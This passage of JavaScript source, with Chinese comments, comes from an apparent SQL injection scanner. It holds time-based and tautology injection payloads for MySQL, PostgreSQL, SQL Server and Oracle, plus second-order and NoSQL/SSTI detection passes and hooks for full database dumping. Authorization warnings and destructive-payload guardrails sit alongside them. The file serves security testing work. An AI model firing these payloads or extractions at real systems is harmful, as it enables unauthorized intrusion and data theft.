                  if (this._prefilterSimilar(quoteBody, quoteStatus, bBody, bStatus)) {
                    skipIds.add(point.id);
                    return;
                  }
                }
              } catch { /* 甄别失败 → 保守保留 */ }
            }
            return;
          }
          // 探测② 时间向量：任一族探针耗时明显高于绝对下限 → 触发延迟 → 保留
          if (timed.some((t) => t.elapsed >= timeFloorMs)) return;
          // 两探皆无信号 → 判为无注入迹象，跳过完整检测
          skipIds.add(point.id);
        } catch {
          // 探测异常（如 URL 构造失败）→ 保守保留
        }
      },
      4 // [MERGED: perf] 点级并发上限
    );
    return [...knownPoints, ...points.filter((p) => !skipIds.has(p.id))];
  }

  // [P1-FIX 2026-09-05] 基线 RTT 实测（预筛选共享 1 次）：注入原值的单次请求耗时。
  // 失败/超时返回 null（调用方跳过预筛）。2s 上限防不可达目标拖慢流水线。
  async _probeBaselineRttMs(httpClient, prefilterCtx, target, samplePoint) {
    const point = samplePoint || null;
    if (!point) return null;
    try {
      const t0 = Date.now();
      const req = buildInjectionRequest(target, point, point.originalValue || '1');
      const res = await sendInjection(httpClient, prefilterCtx, req, { timeoutMs: 2000, retry: 0 });
      if (res == null || isUnusableResponse(res)) return null;
      const elapsed = Date.now() - t0;
      return Number.isFinite(elapsed) && elapsed >= 0 ? elapsed : null;
    } catch {
      return null;
    }
  }

  // [P1-FIX 2026-09-05] 时间探针按 dbms 选族（闭引号上下文，与原 MySQL SLEEP 样式一致）：
  //   MySQL 族 → AND SLEEP(s)；PostgreSQL → AND pg_sleep(s) IS NULL；
  //   SQL Server → '; WAITFOR DELAY（堆叠）；Oracle → DBMS_PIPE.RECEIVE_MESSAGE；
  //   SQLite（无服务器端 sleep）→ 空数组，仅靠单引号报错探针；
  //   未知库 → MySQL + PG 双族（覆盖公网最常见两系，语法错误在异构库上只会快速失败，无副作用）。
  _timeProbeValues(dbms, sleepSec) {
    const s = Number(sleepSec) || 2;
    switch (String(dbms || '').toLowerCase()) {
      case 'mysql': case 'mariadb': case 'tidb':
        return [`' AND SLEEP(${s})-- -`];
      case 'postgresql':
        return [`' AND pg_sleep(${s}) IS NULL-- -`];
      case 'sql server': case 'mssql':
        return [`'; WAITFOR DELAY '0:0:${s}'--`];
      case 'oracle': case 'dm8':
        return [`' AND DBMS_PIPE.RECEIVE_MESSAGE('pf', ${s}) = 'pf'-- -`];
      case 'sqlite':
        return [];
      default:
        return [`' AND SLEEP(${s})-- -`, `' AND pg_sleep(${s}) IS NULL-- -`];
    }
  }

  // [P1-PERF 2026-09-08 实战批次] 输入校验型目标的「可证安全跳过」判定（单参数目标专用）。
  // 背景（实测）：作战中最费时间的往往不是「有注入」，而是「参数在进 SQL 之前就被白名单拦死」——
  // ?id=1' 与 ?id=1zz9qx0 返回同一张 400 页。多参数目标有 _prefilterPoints 兜住，但单参数目标被
  // 刻意排除在预筛之外（scanRunner.js:199：怕在唯一的点上误剪导致漏检），于是这类目标仍要打满
  // 200+ 请求（e2e fp_strict 实测 211）：既慢，又在 WAF/风控上刷出一堆无效攻击特征——真实项目里
  // 这就足够让出口 IP 被临时封禁，把后面几个真正值得打的系统一起拖死。
  // 判定比「报错页相同」强一档，能排除最危险的反例「目标真有洞但异常被统一吞掉」：
  //   ① 基线为正常页（<400），单引号探针偏离基线且为 >=400；
  //   ② 良性非法值（zz9qx0，无任何 SQL 特征）与单引号响应同构 → 疑似输入校验而非 SQL 报错；
  //   ③ 恒真串探针必须同样被拒（字符串上下文 `' OR '1'='1` 与数字上下文 ` OR 1=1`）：
  //      SQL 若真被执行，恒真条件会返回正常页（差异即信号）→ 说明「同构」只是异常被吞 → 保留；
  //   ④ 四路响应体任一含 SQL 报错签名（ERROR_SIG）→ 保留。
  // 请求成本：每点 5 个（基线 → 单引号 → 剩下三路并行，墙钟≈2-3 RTT；串行前两步是为了
  // 在基线/单引号不满足形状时立即放弃，不多花那 3 个），换掉 200+ 请求的完整检测预算。
  // 保守红线：任一探测失败/超时/判定不成立 → 保留完整检测，本方法绝不「判不出就跳过」。
  async _validationGuardedSkipPoints(ctxBase, target, points) {
    const cfg = ctxBase.config || {};
    if (target.mode === 'direct' || !Array.isArray(points) || points.length === 0) {
      return { candidate: points || [], skipped: [] };
    }
    const httpClient = ctxBase.httpClient;
    const prefilterCtx = { ...ctxBase, target };
    // 单探针超时：与预筛选同量级（不可达目标快速放弃 → 保守保留），可被 prefilterBudgetMs 覆盖
    const budgetMs =
      Number.isFinite(cfg.prefilterBudgetMs) && cfg.prefilterBudgetMs > 0 ? cfg.prefilterBudgetMs : 1500;
    const skip = new Map();

    await mapPool(points, async (point) => {
      const orig = point.originalValue || '1';
      // 每路响应只剔「自己那次注入的值」（部分目标错误页会原样回显非法输入，不剔则永远不同构）。
      // 不剔 orig 本身：短数字（如 '1'）在正文里无处不在，剔了会把一切变得相同（假跳过 → 漏检）。
      const st = (r) => r?.res?.status ?? null;
      const rawBody = (r) => String(r?.res?.data ?? '');
      const norm = (r, value) => this._normEcho(rawBody(r), value);
      const probe = (value) => {
        const req = buildInjectionRequest(target, point, value);
        return sendInjection(httpClient, prefilterCtx, req, { timeoutMs: budgetMs, retry: 0 })
          .then((res) => ({ res, value }))
          .catch(() => null);
      };
      try {
        const base = await probe(orig);
        if (!base || base.res == null || isUnusableResponse(base.res)) return;
        const baseStatus = st(base);
        // ① 基线必须是正常页（基线本身就 4xx/5xx 的目标形态不明，不判）
        if (baseStatus == null || baseStatus >= 400) return;
        const quote = await probe(`${orig}'`);
        if (!quote || quote.res == null || isUnusableResponse(quote.res)) return;
        const quoteStatus = st(quote);
        // 单引号探针必须是报错状态码（200 自定义错误页与真注入天然同构，不可判）
        if (quoteStatus == null || quoteStatus < 400) return;
        const quoteBody = norm(quote, `${orig}'`);
        // ② 单引号必须偏离基线（与基线同构说明连报错都没有，交给常规流程）
        if (this._prefilterSimilar(rawBody(base), baseStatus, quoteBody, quoteStatus)) return;
        const rest = await Promise.all([
          probe(`${orig}zz9qx0`),
          probe(`${orig}' OR '1'='1`),
          probe(`${orig} OR 1=1`),
        ]);
        // 任一探测失败（网络错误/超时/返回空）→ 无法判定 → 保守保留
        if (rest.some((r) => !r || r.res == null || isUnusableResponse(r.res))) return;
        // ④ 任一回包含 SQL 报错签名 → 明确保留（error 技术有活可干）
        if (ERROR_SIG.test(rawBody(quote))) return;
        for (const r of rest) if (ERROR_SIG.test(rawBody(r))) return;
        // ②+③ 良性非法值与两个恒真串探针必须与单引号响应同构且均为 >=400：
        // SQL 真被执行时恒真条件会返回正常页，任一路差异 → 不跳过（防「异常被吞」型漏检）。
        for (const r of rest) {
          const rs = st(r);
          if (rs == null || rs < 400) return;
          if (!r) continue;
          if (!this._prefilterSimilar(quoteBody, quoteStatus, norm(r, r.value), rs)) return;
        }
        skip.set(point.id, {
          pointId: point.id,
          reason: 'input_validation',
          note: `基线 ${baseStatus}，单引号/良性非法值/恒真串四路探针均同构于 ${quoteStatus} 且无 SQL 报错签名 → 判定为输入校验拦截而非 SQL 报错`,
        });
      } catch {
        // 探测异常 → 保守保留
      }
    }, 4);

    if (skip.size === 0) return { candidate: points, skipped: [] };
    return { candidate: points.filter((p) => !skip.has(p.id)), skipped: [...skip.values()] };
  }

  // [P1-PERF 2026-09-08] 回显剥离：把本次注入值（原样 / URL 编码 / HTML 实体）从正文剔掉后再比对，
  // 使「错误页回显了非法输入」的目标（很常见：`Invalid id: 1'`）也能得到同构判定。
  // 只用于跳过判定的比对侧，不改变任何检测器看到的原始响应；短于 2 字符的值不剔（防误剔）。
  _normEcho(body, value) {
    let s = String(body ?? '');
    const raw = String(value ?? '');
    if (!s || raw.length < 2) return s;
    const variants = new Set([raw, encodeURIComponent(raw), raw.replace(/'/g, '&#39;'), raw.replace(/"/g, '&#34;')]);
    for (const variant of variants) {
      if (variant.length < 2) continue;
      s = s.split(variant).join('');
    }
    return s;
  }

  // 预筛选相似判定（与 Detector._boundarySimilar 同思路的轻量内联，避免跨模块耦合）：
  // 状态码一致 + 长度差在容差内 + 最长公共前缀 ≥ 85% → 视为「无报错信号」。
  _prefilterSimilar(baseBody, baseStatus, body, status) {
    if (status != null && baseStatus != null && status !== baseStatus) return false;
    const la = baseBody.length;
    const lb = body.length;
    if (Math.abs(la - lb) > Math.max(24, Math.max(la, lb) * 0.12)) return false;
    const m = Math.min(la, lb);
    if (m === 0) return la === lb;
    let common = 0;
    while (common < m && baseBody[common] === body[common]) common++;
    return common >= m * 0.85;
  }

  // 二阶注入补充趟：在既有一阶聚合之后运行，对"每个存储点 × 每个触发页"调用独立 SecondOrderDetector。
  // 门控（唯一硬门）：secondOrder.enabled && triggerUrls 非空 && 存在 isStorePoint 点；
  // 否则直接 return []（零写、对一阶零侵入）。命中结果复用既有 foundByPoint → 聚合去重 → riskOf 通道。
  async _runSecondOrder(scanId, target, points, dbms) {
    const so = (target.config && target.config.secondOrder) || {};
    if (!so.enabled) return []; // 未启用：直接跳过，对目标零写
    const triggerUrls = Array.isArray(so.triggerUrls) ? so.triggerUrls : [];
    if (triggerUrls.length === 0) return []; // 无候选触发页：跳过
    const storePoints = points.filter((p) => p && p.isStorePoint);
    if (storePoints.length === 0) return []; // 无存储点：跳过

    // 告警：开启二阶检测即代表将对目标发起真实写请求（POST 注册/评论/资料）
    logger.warn(
      '二阶检测已开启：将对目标发起真实写请求（POST 注册/评论/资料），仅在你确认已授权目标时执行'
    );

    // 二阶 OOB 触发：oobTrigger 开启且 oob 启用时，确保带外接收端就绪（幂等；失败仅告警不阻断，
    // 检测器侧会再以 OOB_DISABLED 拒绝未就绪分支，由下方 try/catch 捕获记录）
    const oobCfg = (target.config && target.config.oob) || {};
    if (so.oobTrigger === true && oobCfg.enabled) {
      try {
        await oobReceiver.start(oobCfg);
      } catch (e) {
        logger.warn(`二阶 OOB 接收端启动失败，OOB 触发判定将不可用：${e.message}`);
      }
    }

    const collected = [];
    // [P0-FIX 2026-09-06] ctxBase 补 dbms：缺失时 SecondOrderDetector._buildProbe 走
    // SECOND_ORDER_PROBES[0]（单引号裸探针）而非该库报错模板 → 探针退化必漏（real-world-lab 实测）
    const ctxBase = { httpClient: this._wrapWithSignal(scanId, this.getScanClient(scanId, target)), config: target.config, dbms };
    // [P1-FIX 2026-09-07] 按「存储目标」分组调度：同一 actionUrl（同一张表单）的字段共享
    // 同一份存储——并发检测时 A 点刚写入的探针会被 B 点的写入覆盖（实测 body 点探针被
    // item_id 点阴性对照覆盖 → 触发页读到良性值 → 恒漏检）。故同组内严格串行，
    // 不同 actionUrl（不同表单/不同存储）之间仍可并行。
    const storeGroups = new Map();
    for (const p of storePoints) {
      const key = String(p.actionUrl || p.id);
      if (!storeGroups.has(key)) storeGroups.set(key, []);
      storeGroups.get(key).push(p);
    }
    const groups = [...storeGroups.values()];
    // [MERGED: perf] 并发治理：旧实现双层 for 全串行（storePoints × triggerUrls 逐对 await），
    // 10 存储点 × 3 触发页 = 30 次检测墙钟线性累加。现按「存储组」并行（_mapPool 限并发，
    // 默认 2；组内存储点与触发页均串行——同一存储内并发写会相互污染读回判定）。
    const concurrency = Math.max(1, Math.min(Number(so.concurrency) || 2, groups.length));
    await this._mapPool(
      groups,
      async (group) => {
        for (const point of group) {
          const pointDbms = dbms || point.dbms; // 复用一阶已识别的 dbms（若有时）
          for (const triggerUrl of triggerUrls) {
            const ctx = { ...ctxBase, target, point, dbms: pointDbms, triggerUrl, scanId };
            try {
              const result = await this.secondOrderDetector.detect(ctx);
              if (result.vulnerable) {
                // 复用既有聚合/风险纳管通道：先经 ReportGenerator.riskOf 定级（second_order → High）
                const risk = this.reportGen.riskOf([
                  createVulnerability(point.id, 'second_order', 'Medium', result.payloads, result.evidence),
                ]);
                const vuln = createVulnerability(
                  point.id,
                  'second_order',
                  risk,
                  result.payloads,
                  result.evidence
                );
                vuln.dbms = result.dbms;
                collected.push(vuln);
                eventBus.emit(scanId, 'detection_found', { ...result, riskLevel: risk });
              }
            } catch (e) {
              logger.warn(`二阶检测失败（点 ${point.id} / 触发页 ${triggerUrl}）：${e.message}`);
            }
          }
        }
      },
      concurrency
    );
    await this._maybeClose(ctxBase.httpClient);
    return collected;
  }

  // 非 SQL 注入补充趟（NoSQL/GraphQL/SSTI）：门控 noSql.enabled 才运行，默认关闭（opt-in）。
  // 对一阶流水线零侵入：仅在启用时对每个注入点 × 每个类别（nosql/graphql/ssti）调用独立 NoSqlInjectionDetector。
  // 命中复用既有聚合/风险纳管通道（technique 统一记为 'nosql'，报告层按 noSqlKind 细分展示）。
  async _runNoSql(scanId, target, points, dbms) {
    const noSql = (target.config && target.config.noSql) || {};
    if (!noSql.enabled) return []; // 未启用：直接跳过，对目标零额外请求
    const kinds = Array.isArray(noSql.kinds) && noSql.kinds.length ? noSql.kinds : ['nosql', 'graphql', 'ssti'];
    const collected = [];
    const ctxBase = { httpClient: this._wrapWithSignal(scanId, this.getScanClient(scanId, target)), config: target.config };
    logger.info(`非SQL注入检测已开启（类别：${kinds.join('/')}），将对 ${points.length} 个注入点逐一探测`);
    // [MERGED: perf] 并发治理：旧实现点 × 类别双层串行；现按「注入点」并行（_mapPool 限并发 2），
    // 同一注入点内类别仍串行（探测表按成本升序命中即停的短路语义不变）。
    const concurrency = Math.max(1, Math.min(Number(noSql.concurrency) || 2, points.length));
    await this._mapPool(
      points,
      async (point) => {
        for (const kind of kinds) {
          const ctx = { ...ctxBase, target, point, dbms: dbms || point.dbms, noSqlKind: kind };
          try {
            const result = await this.noSqlDetector.detect(ctx);
            if (result.vulnerable) {
              const risk = this.reportGen.riskOf([
                createVulnerability(point.id, 'nosql', 'Medium', result.payloads, result.evidence),
              ]);
              const vuln = createVulnerability(point.id, 'nosql', risk, result.payloads, result.evidence);
              vuln.dbms = null;
              vuln.noSqlKind = kind; // 透传细分类别（NoSQL/GraphQL/SSTI）
              collected.push(vuln);
              eventBus.emit(scanId, 'detection_found', { ...result, riskLevel: risk });
            }
          } catch (e) {
            logger.warn(`非SQL注入检测失败（点 ${point.id} / 类别 ${kind}）：${e.message}`);
          }
        }
      },
      concurrency
    );
    await this._maybeClose(ctxBase.httpClient);
    return collected;
  }

  // 完整拖库（库→表→列→数据）
  // extractScope 存在时（CLI --dbs/--tables/--columns/--dump/--current-db/--current-user/--count）
  // 走 _extractByScope 定向枚举；否则保留既有全量拖库逻辑（零回归）。
  async _extract(scanId, ctx) {
    return extractAll(this, scanId, ctx);
  }

  // [P2] 委托 scanHelpers.mapPool
  async _mapPool(items, fn, concurrency) {
    return mapPool(items, fn, concurrency);
  }

  // [P2] 委托 scanHelpers.mergeExtracted
  _mergeExtracted(target, src) {
    return mergeExtracted(target, src);
  }

  // [P2] 委托 scanHelpers.mergeExtractedForResume
  _mergeExtractedForResume(current, restored) {
    return mergeExtractedForResume(current, restored);
  }

  // [P2] 委托 scanHelpers.hasData
  _hasData(data) {
    return hasData(data);
  }

  // 枚举模式提取（对标 sqlmap --dbs/--tables/--columns/--dump/--current-db/--current-user/--count）。
  // extractScope = { mode, dbs?, tables?, cols?, excludeSysdbs? }
  //   dbs/tables 为数组；cols 为逗号串或数组；excludeSysdbs 默认 true。
  // 返回与 emptyExtractedData 同结构的对象（含 mode 专用字段 currentDb/currentUser/counts）。
  async _extractByScope(scanId, ctx, scope) {
    return extractByScope(this, scanId, ctx, scope);
  }
}


/**
 * [P0-FIX 2026-09-09] 汇总「本次扫描被抑住了什么能力」，写进 report.summary.constraints。
 *
 * 为什么需要：本项目反复出现同一类缺陷——开关存在、引擎支持、中间断链，而用户以为生效了。
 * 把「没做」显式写出来，质控与交付时才能回答「你到底测了什么」；一句「已按最高风险等级测试」
 * 在没投放高危池时就是不实陈述。仅记真实可抑制项：当前 level/risk 本来就投不到高危模板时不记，
 * 免得给人一条假线索去改无关开关。
 *
 * @param {object} config 扫描配置（target.config）
 * @returns {string[]} 可读说明（空数组 = 本次无任何能力被抑制）
 */
export function collectCapabilityConstraints(config = {}) {
  const out = [];
  const productionMode = config.productionMode !== false;
  const confirmDestructive = config.confirmDestructive === true;
  const risk = Number(config.risk) || Number(defaults.risk) || 2;
  const level = Number(config.level) || Number(defaults.level) || 1;
  const useRegistry = config.useRegistry === true;

  if (productionMode && !confirmDestructive) {
    let n = 0;
    try {
      n = countDestructiveCandidates({ level, risk, testFilter: config.testFilter, testSkip: config.testSkip });
    } catch {
      n = 0;
    }
    if (n > 0) {
      out.push(
        `高危 payload 池（写文件/RCE/重运算类，本配置下候选 ${n} 条）已抑制：` +
          'productionMode=true 且未 confirmDestructive=true。确需在已授权目标上投放时显式设 confirmDestructive=true；' +
          '靶场/演练环境可整体关护栏（productionMode=false）'
      );
    }
  }
  if (!useRegistry && risk >= 3) {
    out.push(
      '扁平 payload 路径（useRegistry=false）不经过注册表高危池门控：REST/UI 下高危向量根本不会投放'
        + '（只允许 CLI 的 --risk 3 + --confirm-destructive 显式合并到进程级 payload 池）。' +
        '要真正拿到 risk=3 语义请用 useRegistry=true（受本护栏约束）或走 CLI 双开关'
    );
  }
  const so = config.secondOrder && typeof config.secondOrder === 'object' ? config.secondOrder : {};
  if (so.enabled === true && productionMode && so.allowWrites !== true) {
    out.push(
      '二阶非幂等写请求（POST/PUT/PATCH/DELETE）已抑制：productionMode=true 时需 secondOrder.allowWrites=true。' +
        '未放行时只跑幂等方法（GET/HEAD/OPTIONS），存储型写路径可能测不到'
    );
  }
  if (config.enableExtract === true) {
    out.push(
      '本次开启拖库（enableExtract）：提取阶段会向目标发出大量读请求（受限速与行数上限约束）。' +
        '生产环境建议控制行数并避开业务高峰'
    );
  }
  return out;
}

export default ScanManager;
